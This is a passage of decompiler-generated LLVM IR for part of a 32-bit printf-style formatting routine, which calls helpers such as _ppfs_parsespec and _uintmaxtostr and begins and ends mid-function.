  %v3_804e19d = inttoptr i32 %v2_804e19d to i32*
  store i32 %v0_804e19d, i32* %v3_804e19d, align 4
  %v0_804e19e = load i32, i32* %stack_var_-364, align 4
  %v4_804e19e = call i32 @__stdio_fwrite(i32 %v0_804e19e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e19e, i32* %eax.global-to-local, align 4
  %v0_804e1a3 = load i32, i32* @esp, align 4
  %v1_804e1a3 = add i32 %v0_804e1a3, 16
  %v7_804e1a3 = icmp slt i32 %v1_804e1a3, 0
  store i1 %v7_804e1a3, i1* %sf.global-to-local, align 1
  %v1_804e1a6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e1a6

dec_label_pc_804e1a6:                             ; preds = %dec_label_pc_804e18a, %dec_label_pc_804e194
  %v3_804e1ae = phi i32 [ %v2_804e186, %dec_label_pc_804e18a ], [ %v1_804e1a6.pre, %dec_label_pc_804e194 ]
  %v0_804e1a6 = phi i32 [ 0, %dec_label_pc_804e18a ], [ %v4_804e19e, %dec_label_pc_804e194 ]
  %v2_804e1a6 = sub i32 %v0_804e1a6, %v3_804e1ae
  %v12_804e1a6 = icmp eq i32 %v2_804e1a6, 0
  %v13_804e1a6 = icmp slt i32 %v2_804e1a6, 0
  store i1 %v13_804e1a6, i1* %sf.global-to-local, align 1
  %v1_804e1a8 = icmp eq i1 %v12_804e1a6, false
  %v0_804e69f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e1a8, label %dec_label_pc_804e69f, label %dec_label_pc_804e1ae

dec_label_pc_804e1ae:                             ; preds = %dec_label_pc_804e1a6
  %v1_804e1ae = inttoptr i32 %v0_804e69f.pre.pre to i32*
  %v2_804e1ae = load i32, i32* %v1_804e1ae, align 4
  %v4_804e1ae = add i32 %v2_804e1ae, %v3_804e1ae
  %v15_804e1ae = icmp slt i32 %v4_804e1ae, 0
  store i1 %v15_804e1ae, i1* %sf.global-to-local, align 1
  store i32 %v4_804e1ae, i32* %v1_804e1ae, align 4
  %v0_804e1b1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e1b1

dec_label_pc_804e1b1:                             ; preds = %dec_label_pc_804e186, %dec_label_pc_804e1ae
  %v0_804e697 = phi i32 [ %v0_804e18a, %dec_label_pc_804e186 ], [ %v0_804e1b1.pre, %dec_label_pc_804e1ae ]
  %v1_804e1b1 = inttoptr i32 %v0_804e697 to i8*
  %v2_804e1b1 = load i8, i8* %v1_804e1b1, align 1
  %v3_804e1b1 = icmp eq i8 %v2_804e1b1, 0
  %v4_804e1b1 = icmp slt i8 %v2_804e1b1, 0
  store i1 %v4_804e1b1, i1* %sf.global-to-local, align 1
  br i1 %v3_804e1b1, label %dec_label_pc_804e6a6, label %dec_label_pc_804e1ba

dec_label_pc_804e1ba:                             ; preds = %dec_label_pc_804e1b1
  %v1_804e1ba = add i32 %v0_804e697, 1
  %v2_804e1ba = inttoptr i32 %v1_804e1ba to i8*
  %v3_804e1ba = load i8, i8* %v2_804e1ba, align 1
  %v4_804e1ba = add i8 %v3_804e1ba, -37
  %v12_804e1ba = icmp eq i8 %v4_804e1ba, 0
  %v13_804e1ba = icmp slt i8 %v4_804e1ba, 0
  store i1 %v13_804e1ba, i1* %sf.global-to-local, align 1
  store i32 %v1_804e1ba, i32* %edx.global-to-local, align 4
  br i1 %v12_804e1ba, label %dec_label_pc_804e697, label %dec_label_pc_804e1c7

dec_label_pc_804e1c7:                             ; preds = %dec_label_pc_804e1ba
  %v1_804e1c7 = load i32, i32* @esp, align 4
  %v2_804e1c7 = add i32 %v1_804e1c7, 16
  %v3_804e1c7 = inttoptr i32 %v2_804e1c7 to i32*
  store i32 %v1_804e1ba, i32* %v3_804e1c7, align 4
  %v0_804e1cb = load i32, i32* @esp, align 4
  %v1_804e1cb = add i32 %v0_804e1cb, 340
  %v2_804e1cb = inttoptr i32 %v1_804e1cb to i32*
  store i32 0, i32* %v2_804e1cb, align 4
  %v0_804e1d6 = load i32, i32* @esp, align 4
  %v1_804e1d6 = add i32 %v0_804e1d6, -12
  %v10_804e1d6 = icmp slt i32 %v1_804e1d6, 0
  store i1 %v10_804e1d6, i1* %sf.global-to-local, align 1
  %v1_804e1d9 = add i32 %v0_804e1d6, 16
  store i32 %v1_804e1d9, i32* @ebx, align 4
  %v2_804e1dd = add i32 %v0_804e1d6, -16
  %v3_804e1dd = inttoptr i32 %v2_804e1dd to i32*
  store i32 %v1_804e1d9, i32* %v3_804e1dd, align 4
  %v0_804e1de = load i32, i32* %stack_var_-364, align 4
  %v1_804e1de = inttoptr i32 %v0_804e1de to i32*
  %v2_804e1de = call i32 @_ppfs_parsespec(i32* %v1_804e1de)
  store i32 %v2_804e1de, i32* %eax.global-to-local, align 4
  %v0_804e1e3 = load i32, i32* @ebx, align 4
  %v1_804e1e3 = load i32, i32* @esp, align 4
  %v2_804e1e3 = inttoptr i32 %v1_804e1e3 to i32*
  store i32 %v0_804e1e3, i32* %v2_804e1e3, align 4
  %v0_804e1e6 = load i32, i32* %stack_var_-364, align 4
  %v1_804e1e6 = call i32 @_ppfs_setargs(i32 %v0_804e1e6)
  store i32 %v1_804e1e6, i32* %eax.global-to-local, align 4
  %v0_804e1eb = load i32, i32* @esp, align 4
  %v1_804e1eb = add i32 %v0_804e1eb, 70
  %v2_804e1eb = inttoptr i32 %v1_804e1eb to i8*
  %v3_804e1eb = load i8, i8* %v2_804e1eb, align 1
  %v4_804e1eb = zext i8 %v3_804e1eb to i32
  store i32 %v4_804e1eb, i32* @edi, align 4
  %v1_804e1f0 = add i32 %v0_804e1eb, 16
  %v1_804e1f3 = add i32 %v0_804e1eb, 56
  %v2_804e1f3 = inttoptr i32 %v1_804e1f3 to i32*
  %v3_804e1f3 = load i32, i32* %v2_804e1f3, align 4
  %v5_804e1f3 = icmp slt i32 %v3_804e1f3, 0
  store i1 %v5_804e1f3, i1* %sf.global-to-local, align 1
  %v1_804e1f8 = add i32 %v0_804e1eb, 112
  store i32 %v1_804e1f8, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_804e1f3, 1
  br i1 %tmp66, label %dec_label_pc_804e205, label %dec_label_pc_804e1fe

dec_label_pc_804e1fe:                             ; preds = %dec_label_pc_804e1c7
  %v2_804e1fe = zext i8 %v3_804e1eb to i32
  %v3_804e1fe = mul nuw nsw i32 %v2_804e1fe, 12
  store i32 %v3_804e1fe, i32* %eax.global-to-local, align 4
  %v2_804e201 = add i32 %v0_804e1eb, 100
  %v3_804e201 = add i32 %v2_804e201, %v3_804e1fe
  store i32 %v3_804e201, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e205

dec_label_pc_804e205:                             ; preds = %dec_label_pc_804e1c7, %dec_label_pc_804e1fe
  %v0_804e20d27 = phi i32 [ %v1_804e1f8, %dec_label_pc_804e1c7 ], [ %v3_804e201, %dec_label_pc_804e1fe ]
  %v1_804e205 = add i32 %v0_804e1eb, 60
  %v2_804e205 = inttoptr i32 %v1_804e205 to i32*
  %v3_804e205 = load i32, i32* %v2_804e205, align 4
  store i32 %v3_804e205, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e21872 = sub i32 0, %v3_804e205
  %v10_804e21875 = and i32 %v3_804e205, %v2_804e21872
  %v11_804e21876 = icmp slt i32 %v10_804e21875, 0
  %v13_804e21877 = icmp slt i32 %v2_804e21872, 0
  %v2_804e21a78 = icmp eq i1 %v13_804e21877, %v11_804e21876
  br i1 %v2_804e21a78, label %dec_label_pc_804e21c, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e205, %dec_label_pc_804e20d
  %v0_804e21c82 = phi i32 [ %v0_804e21c, %dec_label_pc_804e20d ], [ %v1_804e1f0, %dec_label_pc_804e205 ]
  %v2_804e20d81 = phi i32 [ %v1_804e217, %dec_label_pc_804e20d ], [ 0, %dec_label_pc_804e205 ]
  %v0_804e20d80 = phi i32 [ %v1_804e214, %dec_label_pc_804e20d ], [ %v0_804e20d27, %dec_label_pc_804e205 ]
  %v3_804e20d = mul i32 %v2_804e20d81, 4
  %v4_804e20d = add i32 %v3_804e20d, 344
  %v5_804e20d = add i32 %v4_804e20d, %v0_804e21c82
  %v6_804e20d = inttoptr i32 %v5_804e20d to i32*
  store i32 %v0_804e20d80, i32* %v6_804e20d, align 4
  %v0_804e214 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e214 = add i32 %v0_804e214, 12
  store i32 %v1_804e214, i32* %edx.global-to-local, align 4
  %v0_804e217 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e217 = add i32 %v0_804e217, 1
  %v1_804e218.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e217, i32* %eax.global-to-local, align 4
  %v2_804e218 = sub i32 %v1_804e217, %v1_804e218.pre
  %v8_804e218 = xor i32 %v1_804e217, %v1_804e218.pre
  %v9_804e218 = xor i32 %v2_804e218, %v1_804e217
  %v10_804e218 = and i32 %v9_804e218, %v8_804e218
  %v11_804e218 = icmp slt i32 %v10_804e218, 0
  %v13_804e218 = icmp slt i32 %v2_804e218, 0
  %v2_804e21a = icmp eq i1 %v13_804e218, %v11_804e218
  %v0_804e21c = load i32, i32* @esp, align 4
  br i1 %v2_804e21a, label %dec_label_pc_804e21c, label %dec_label_pc_804e20d

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e20d, %dec_label_pc_804e205
  %v0_804e21c.lcssa = phi i32 [ %v1_804e1f0, %dec_label_pc_804e205 ], [ %v0_804e21c, %dec_label_pc_804e20d ]
  %v1_804e21c = add i32 %v0_804e21c.lcssa, 48
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  %v3_804e21c = load i32, i32* %v2_804e21c, align 4
  store i32 %v3_804e21c, i32* %ecx.global-to-local, align 4
  %v1_804e220 = icmp eq i32 %v3_804e21c, 0
  %v2_804e220 = icmp slt i32 %v3_804e21c, 0
  store i1 %v2_804e220, i1* %sf.global-to-local, align 1
  %v1_804e222 = icmp eq i1 %v1_804e220, false
  br i1 %v1_804e222, label %dec_label_pc_804e24a, label %dec_label_pc_804e224

dec_label_pc_804e224:                             ; preds = %dec_label_pc_804e21c
  %v1_804e224 = inttoptr i32 %v0_804e21c.lcssa to i32*
  %v2_804e224 = load i32, i32* %v1_804e224, align 4
  store i32 %v2_804e224, i32* %eax.global-to-local, align 4
  %v1_804e227 = ashr i32 %v2_804e224, 31
  store i32 %v1_804e227, i32* %edx.global-to-local, align 4
  %v2_804e228 = add i32 %v0_804e21c.lcssa, -4
  %v3_804e228 = inttoptr i32 %v2_804e228 to i32*
  store i32 %v1_804e227, i32* %v3_804e228, align 4
  %v0_804e229 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e229 = add i32 %v0_804e21c.lcssa, -8
  %v3_804e229 = inttoptr i32 %v2_804e229 to i32*
  store i32 %v0_804e229, i32* %v3_804e229, align 4
  %v1_804e22a = add i32 %v0_804e21c.lcssa, 32
  %v2_804e22a = inttoptr i32 %v1_804e22a to i32*
  %v3_804e22a = load i32, i32* %v2_804e22a, align 4
  %v1_804e22e = and i32 %v3_804e22a, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e22e, i32* %eax.global-to-local, align 4
  %v2_804e233 = add i32 %v0_804e21c.lcssa, -12
  %v3_804e233 = inttoptr i32 %v2_804e233 to i32*
  store i32 %v1_804e22e, i32* %v3_804e233, align 4
  %v1_804e234 = add i32 %v0_804e21c.lcssa, 344
  %v2_804e234 = inttoptr i32 %v1_804e234 to i32*
  %v3_804e234 = load i32, i32* %v2_804e234, align 4
  store i32 %v3_804e234, i32* %eax.global-to-local, align 4
  %v1_804e23b = inttoptr i32 %v3_804e234 to i32*
  %v2_804e23b = load i32, i32* %v1_804e23b, align 4
  %v4_804e23b = add i32 %v0_804e21c.lcssa, -16
  %v5_804e23b = inttoptr i32 %v4_804e23b to i32*
  store i32 %v2_804e23b, i32* %v5_804e23b, align 4
  %v0_804e23d = call i32 @_store_inttype()
  store i32 %v0_804e23d, i32* %eax.global-to-local, align 4
  %v0_804e242 = load i32, i32* @esp, align 4
  %v1_804e242 = add i32 %v0_804e242, 16
  %v7_804e242 = icmp slt i32 %v1_804e242, 0
  store i1 %v7_804e242, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e68c

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e21c
  %v1_804e24a = add i32 %v3_804e21c, -7
  %v5_804e24a = icmp ult i32 %v3_804e21c, 7
  %v9_804e24a = icmp eq i32 %v1_804e24a, 0
  %v10_804e24a = icmp slt i32 %v1_804e24a, 0
  store i1 %v10_804e24a, i1* %sf.global-to-local, align 1
  %v2_804e24d = or i1 %v5_804e24a, %v9_804e24a
  br i1 %v2_804e24d, label %dec_label_pc_804e253, label %dec_label_pc_804e3b7

dec_label_pc_804e253:                             ; preds = %dec_label_pc_804e24a
  %v1_804e253 = add i32 %v3_804e21c, 134548408
  %v2_804e253 = inttoptr i32 %v1_804e253 to i8*
  %v3_804e253 = load i8, i8* %v2_804e253, align 1
  %v4_804e253 = sext i8 %v3_804e253 to i32
  store i32 %v4_804e253, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e25f = icmp eq i8 %v3_804e253, 10
  %v10_804e25f = icmp slt i8 %v3_804e253, 10
  store i1 %v10_804e25f, i1* %sf.global-to-local, align 1
  %v1_804e262 = icmp eq i1 %v9_804e25f, false
  br i1 %v1_804e262, label %dec_label_pc_804e282, label %dec_label_pc_804e264

dec_label_pc_804e264:                             ; preds = %dec_label_pc_804e253
  %v1_804e264 = add i32 %v0_804e21c.lcssa, 32
  %v2_804e264 = inttoptr i32 %v1_804e264 to i32*
  %v3_804e264 = load i32, i32* %v2_804e264, align 4
  store i32 %v3_804e264, i32* %eax.global-to-local, align 4
  %v1_804e26a = udiv i32 %v3_804e264, 32
  %tmp67 = urem i32 %v1_804e26a, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_804e27a = or i32 %tmp68, 128
  store i32 %v2_804e27a, i32* %edx.global-to-local, align 4
  %v2_804e27d = and i32 %v3_804e264, 64
  %v3_804e27d = icmp eq i32 %v2_804e27d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e27f = icmp eq i1 %v3_804e27d, false
  %v4_804e27f = select i1 %v1_804e27f, i32 %v2_804e27a, i32 %tmp68
  store i32 %v4_804e27f, i32* @ebx, align 4
  br label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e253, %dec_label_pc_804e264
  %v1_804e282 = add i32 %v3_804e21c, -5
  %v5_804e282 = icmp ult i32 %v3_804e21c, 5
  %v9_804e282 = icmp eq i32 %v1_804e282, 0
  %v10_804e282 = icmp slt i32 %v1_804e282, 0
  store i1 %v10_804e282, i1* %sf.global-to-local, align 1
  %v2_804e285 = or i1 %v5_804e282, %v9_804e282
  br i1 %v2_804e285, label %dec_label_pc_804e287, label %dec_label_pc_804e29f

dec_label_pc_804e287:                             ; preds = %dec_label_pc_804e282
  %v1_804e287 = add i32 %v3_804e21c, -3
  %v9_804e287 = icmp eq i32 %v1_804e287, 0
  %v10_804e287 = icmp slt i32 %v1_804e287, 0
  store i1 %v10_804e287, i1* %sf.global-to-local, align 1
  %v1_804e28a = icmp eq i1 %v9_804e287, false
  br i1 %v1_804e28a, label %dec_label_pc_804e293, label %dec_label_pc_804e28c

dec_label_pc_804e28c:                             ; preds = %dec_label_pc_804e287
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e2a1

dec_label_pc_804e293:                             ; preds = %dec_label_pc_804e287
  %v1_804e293 = add i32 %v3_804e21c, -1
  %v9_804e293 = icmp eq i32 %v1_804e293, 0
  %v10_804e293 = icmp slt i32 %v1_804e293, 0
  store i1 %v10_804e293, i1* %sf.global-to-local, align 1
  br i1 %v9_804e293, label %dec_label_pc_804e2a6, label %dec_label_pc_804e2a1

dec_label_pc_804e29f:                             ; preds = %dec_label_pc_804e282
  %v1_804e29f = sub nsw i32 0, %v4_804e253
  %v7_804e29f = icmp sgt i8 %v3_804e253, 0
  store i1 %v7_804e29f, i1* %sf.global-to-local, align 1
  store i32 %v1_804e29f, i32* @esi, align 4
  br label %dec_label_pc_804e2a1

dec_label_pc_804e2a1:                             ; preds = %dec_label_pc_804e293, %dec_label_pc_804e28c, %dec_label_pc_804e29f
  br label %dec_label_pc_804e2a6

dec_label_pc_804e2a6:                             ; preds = %dec_label_pc_804e293, %dec_label_pc_804e2a1
  %storemerge = phi i32 [ 11, %dec_label_pc_804e2a1 ], [ 6, %dec_label_pc_804e293 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804e2a6 = add i32 %v0_804e21c.lcssa, 20
  %v2_804e2a6 = inttoptr i32 %v1_804e2a6 to i32*
  %v3_804e2a6 = load i32, i32* %v2_804e2a6, align 4
  %v5_804e2a6 = icmp slt i32 %v3_804e2a6, 0
  store i1 %v5_804e2a6, i1* %sf.global-to-local, align 1
  %v1_804e2ab = add i32 %v0_804e21c.lcssa, 7
  %v2_804e2ab = inttoptr i32 %v1_804e2ab to i8*
  store i8 32, i8* %v2_804e2ab, align 1
  %v0_804e2b0 = load i1, i1* %sf.global-to-local, align 1
  %v1_804e2b0 = icmp eq i1 %v0_804e2b0, false
  br i1 %v1_804e2b0, label %dec_label_pc_804e2ba, label %dec_label_pc_804e2b2

dec_label_pc_804e2b2:                             ; preds = %dec_label_pc_804e2a6
  %v0_804e2b2 = load i32, i32* @esp, align 4
  %v1_804e2b2 = add i32 %v0_804e2b2, 36
  %v2_804e2b2 = inttoptr i32 %v1_804e2b2 to i8*
  %v3_804e2b2 = load i8, i8* %v2_804e2b2, align 1
  %v4_804e2b2 = zext i8 %v3_804e2b2 to i32
  %v5_804e2b2 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e2b2 = and i32 %v5_804e2b2, -256
  %v7_804e2b2 = or i32 %v6_804e2b2, %v4_804e2b2
  store i32 %v7_804e2b2, i32* %edx.global-to-local, align 4
  %v3_804e2b6 = add i32 %v0_804e2b2, 7
  %v4_804e2b6 = inttoptr i32 %v3_804e2b6 to i8*
  store i8 %v3_804e2b2, i8* %v4_804e2b6, align 1
  br label %dec_label_pc_804e2ba

dec_label_pc_804e2ba:                             ; preds = %dec_label_pc_804e2a6, %dec_label_pc_804e2b2
  %v1_804e2ba = add i32 %v3_804e21c, -1
  %v8_804e2ba = icmp eq i32 %v1_804e2ba, 0
  %v9_804e2ba = icmp slt i32 %v1_804e2ba, 0
  store i1 %v9_804e2ba, i1* %sf.global-to-local, align 1
  store i32 %v1_804e2ba, i32* %ecx.global-to-local, align 4
  %v0_804e2bb = load i32, i32* @esp, align 4
  %v1_804e2bb = add i32 %v0_804e2bb, 344
  %v2_804e2bb = inttoptr i32 %v1_804e2bb to i32*
  %v3_804e2bb = load i32, i32* %v2_804e2bb, align 4
  store i32 %v3_804e2bb, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804e2d3.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e2ba, label %dec_label_pc_804e2d3, label %dec_label_pc_804e2c9

dec_label_pc_804e2c9:                             ; preds = %dec_label_pc_804e2ba
  %v2_804e2c9 = mul i32 %v0_804e2d3.pre, 4
  %v3_804e2c9 = add i32 %v0_804e2bb, 52
  %v4_804e2c9 = add i32 %v3_804e2c9, %v2_804e2c9
  %v5_804e2c9 = inttoptr i32 %v4_804e2c9 to i32*
  %v6_804e2c9 = load i32, i32* %v5_804e2c9, align 4
  %v1_804e2cd = and i32 %v6_804e2c9, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e2cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e2d3

dec_label_pc_804e2d3:                             ; preds = %dec_label_pc_804e2ba, %dec_label_pc_804e2c9
  %v2_804e2d3 = add i32 %v0_804e2bb, -4
  %v3_804e2d3 = inttoptr i32 %v2_804e2d3 to i32*
  store i32 %v0_804e2d3.pre, i32* %v3_804e2d3, align 4
  %v0_804e2d4 = load i32, i32* @esi, align 4
  %v2_804e2d4 = add i32 %v0_804e2bb, -8
  %v3_804e2d4 = inttoptr i32 %v2_804e2d4 to i32*
  store i32 %v0_804e2d4, i32* %v3_804e2d4, align 4
  %v0_804e2d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2d5 = add i32 %v0_804e2bb, -12
  %v3_804e2d5 = inttoptr i32 %v2_804e2d5 to i32*
  store i32 %v0_804e2d5, i32* %v3_804e2d5, align 4
  %v0_804e2d6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2d6 = add i32 %v0_804e2bb, -16
  %v3_804e2d6 = inttoptr i32 %v2_804e2d6 to i32*
  store i32 %v0_804e2d6, i32* %v3_804e2d6, align 4
  %v0_804e2d7 = call i32 @_load_inttype()
  %v0_804e2dc = load i32, i32* @ebx, align 4
  %v1_804e2dc = load i32, i32* @esp, align 4
  %v2_804e2dc = inttoptr i32 %v1_804e2dc to i32*
  store i32 %v0_804e2dc, i32* %v2_804e2dc, align 4
  %v0_804e2df = load i32, i32* @esi, align 4
  %v1_804e2df = load i32, i32* @esp, align 4
  %v2_804e2df = add i32 %v1_804e2df, -4
  %v3_804e2df = inttoptr i32 %v2_804e2df to i32*
  store i32 %v0_804e2df, i32* %v3_804e2df, align 4
  %v0_804e2e0 = load i32, i32* @edx, align 4
  %v2_804e2e0 = add i32 %v1_804e2df, -8
  %v3_804e2e0 = inttoptr i32 %v2_804e2e0 to i32*
  store i32 %v0_804e2e0, i32* %v3_804e2e0, align 4
  %v2_804e2e1 = add i32 %v1_804e2df, -12
  %v3_804e2e1 = inttoptr i32 %v2_804e2e1 to i32*
  store i32 %v0_804e2d7, i32* %v3_804e2e1, align 4
  %v1_804e2e2 = add i32 %v1_804e2df, 347
  store i32 %v1_804e2e2, i32* %eax.global-to-local, align 4
  %v2_804e2e9 = add i32 %v1_804e2df, -16
  %v3_804e2e9 = inttoptr i32 %v2_804e2e9 to i32*
  store i32 %v1_804e2e2, i32* %v3_804e2e9, align 4
  %v0_804e2ea = load i32, i32* %stack_var_-364, align 4
  %v5_804e2ea = inttoptr i32 %v0_804e2ea to i8*
  %v6_804e2ea = call i32 @_uintmaxtostr(i8* %v5_804e2ea, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e2ea, i32* %eax.global-to-local, align 4
  %v0_804e2ef = load i32, i32* @esp, align 4
  %v1_804e2ef = add i32 %v0_804e2ef, 32
  %v1_804e2f2 = add i32 %v0_804e2ef, 80
  %v2_804e2f2 = inttoptr i32 %v1_804e2f2 to i32*
  %v3_804e2f2 = load i32, i32* %v2_804e2f2, align 4
  %v4_804e2f2 = add i32 %v3_804e2f2, -5
  %v8_804e2f2 = icmp ult i32 %v3_804e2f2, 5
  %v12_804e2f2 = icmp eq i32 %v4_804e2f2, 0
  %v13_804e2f2 = icmp slt i32 %v4_804e2f2, 0
  store i1 %v13_804e2f2, i1* %sf.global-to-local, align 1
  store i32 %v6_804e2ea, i32* @edi, align 4
  %v2_804e2f9 = or i1 %v8_804e2f2, %v12_804e2f2
  br i1 %v2_804e2f9, label %dec_label_pc_804e323, label %dec_label_pc_804e2fb

dec_label_pc_804e2fb:                             ; preds = %dec_label_pc_804e2d3
  %v7_804e2ea = inttoptr i32 %v6_804e2ea to i8*
  %v3_804e2fb = load i8, i8* %v7_804e2ea, align 1
  %v4_804e2fb = add i8 %v3_804e2fb, -45
  %v12_804e2fb = icmp eq i8 %v4_804e2fb, 0
  %v13_804e2fb = icmp slt i8 %v4_804e2fb, 0
  store i1 %v13_804e2fb, i1* %sf.global-to-local, align 1
  %v1_804e2fe = icmp eq i1 %v12_804e2fb, false
  %v1_804e30d = add i32 %v0_804e2ef, 64
  %v2_804e30d = inttoptr i32 %v1_804e30d to i32*
  %v3_804e30d = load i32, i32* %v2_804e30d, align 4
  br i1 %v1_804e2fe, label %dec_label_pc_804e30d, label %dec_label_pc_804e300

dec_label_pc_804e300:                             ; preds = %dec_label_pc_804e2fb
  %v4_804e300 = or i32 %v3_804e30d, 2
  store i32 %v4_804e300, i32* %v2_804e30d, align 4
  %v0_804e305 = load i32, i32* @edi, align 4
  %v1_804e305 = add i32 %v0_804e305, 1
  %v9_804e305 = icmp slt i32 %v1_804e305, 0
  store i1 %v9_804e305, i1* %sf.global-to-local, align 1
  store i32 %v1_804e305, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e323.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e323

dec_label_pc_804e30d:                             ; preds = %dec_label_pc_804e2fb
  store i32 %v3_804e30d, i32* %eax.global-to-local, align 4
  %v2_804e311 = and i32 %v3_804e30d, 2
  %v3_804e311 = icmp eq i32 %v2_804e311, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804e311, label %dec_label_pc_804e319, label %dec_label_pc_804e315

dec_label_pc_804e315:                             ; preds = %dec_label_pc_804e30d
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e323

dec_label_pc_804e319:                             ; preds = %dec_label_pc_804e30d
  %v2_804e319 = urem i32 %v3_804e30d, 2
  %v3_804e319 = icmp eq i32 %v2_804e319, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804e320 = icmp eq i1 %v3_804e319, false
  %v2_804e320 = load i32, i32* @ebp, align 4
  %v4_804e320 = select i1 %v1_804e320, i32 4, i32 %v2_804e320
  store i32 %v4_804e320, i32* @ebp, align 4
  br label %dec_label_pc_804e323

dec_label_pc_804e323:                             ; preds = %dec_label_pc_804e2d3, %dec_label_pc_804e315, %dec_label_pc_804e300, %dec_label_pc_804e319
  %v0_804e375 = phi i32 [ %v6_804e2ea, %dec_label_pc_804e2d3 ], [ %v6_804e2ea, %dec_label_pc_804e315 ], [ %v1_804e305, %dec_label_pc_804e300 ], [ %v6_804e2ea, %dec_label_pc_804e319 ]
  %v0_804e385 = phi i32 [ %v1_804e2ef, %dec_label_pc_804e2d3 ], [ %v1_804e2ef, %dec_label_pc_804e315 ], [ %v0_804e323.pre, %dec_label_pc_804e300 ], [ %v1_804e2ef, %dec_label_pc_804e319 ]
  %v1_804e323 = add i32 %v0_804e385, 20
  %v2_804e323 = inttoptr i32 %v1_804e323 to i32*
  %v3_804e323 = load i32, i32* %v2_804e323, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804e327 = sub i32 204, %v0_804e375
  %v2_804e333 = add i32 %v1_804e327, %v0_804e385
  %v1_804e335 = add i32 %v2_804e333, 127
  store i32 %v1_804e335, i32* @esi, align 4
  %v2_804e338 = icmp slt i32 %v3_804e323, 0
  store i1 %v2_804e338, i1* %sf.global-to-local, align 1
  %v3_804e33a = select i1 %v2_804e338, i32 1, i32 %v3_804e323
  store i32 %v3_804e33a, i32* %ecx.global-to-local, align 4
  %v1_804e33d = add i32 %v0_804e385, 32
  %v2_804e33d = inttoptr i32 %v1_804e33d to i8*
  %v3_804e33d = load i8, i8* %v2_804e33d, align 1
  %v4_804e33d = and i8 %v3_804e33d, 16
  %v5_804e33d = icmp eq i8 %v4_804e33d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804e33d, label %dec_label_pc_804e375, label %dec_label_pc_804e344

dec_label_pc_804e344:                             ; preds = %dec_label_pc_804e323
  %v1_804e344 = add i32 %v0_804e385, 48
  %v2_804e344 = inttoptr i32 %v1_804e344 to i32*
  %v3_804e344 = load i32, i32* %v2_804e344, align 4
  store i32 %v3_804e344, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_804e344, 3
  %v3_804e34d = load i32, i32* @ebp, align 4
  %v5_804e34d = select i1 %tmp69, i32 6, i32 %v3_804e34d
  store i32 %v5_804e34d, i32* @ebp, align 4
  %v1_804e350 = add i32 %v3_804e344, -3
  %v9_804e350 = icmp eq i32 %v1_804e350, 0
  %v10_804e350 = icmp slt i32 %v1_804e350, 0
  store i1 %v10_804e350, i1* %sf.global-to-local, align 1
  %v1_804e353 = icmp eq i1 %v9_804e350, false
  br i1 %v1_804e353, label %dec_label_pc_804e35c, label %dec_label_pc_804e355

dec_label_pc_804e355:                             ; preds = %dec_label_pc_804e344
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e375

dec_label_pc_804e35c:                             ; preds = %dec_label_pc_804e344
  %v1_804e35c = add i32 %v3_804e344, -4
  %v9_804e35c = icmp eq i32 %v1_804e35c, 0
  %v10_804e35c = icmp slt i32 %v1_804e35c, 0
  store i1 %v10_804e35c, i1* %sf.global-to-local, align 1
  %v1_804e35f = icmp eq i1 %v9_804e35c, false
  br i1 %v1_804e35f, label %dec_label_pc_804e375, label %dec_label_pc_804e361

dec_label_pc_804e361:                             ; preds = %dec_label_pc_804e35c
  %v2_804e361 = sub i32 %v3_804e33a, %v1_804e335
  %v7_804e361 = icmp ult i32 %v3_804e33a, %v1_804e335
  %v12_804e361 = icmp eq i32 %v2_804e361, 0
  %v13_804e361 = icmp slt i32 %v2_804e361, 0
  store i1 %v13_804e361, i1* %sf.global-to-local, align 1
  %v2_804e363 = or i1 %v7_804e361, %v12_804e361
  br i1 %v2_804e363, label %dec_label_pc_804e365, label %dec_label_pc_804e375

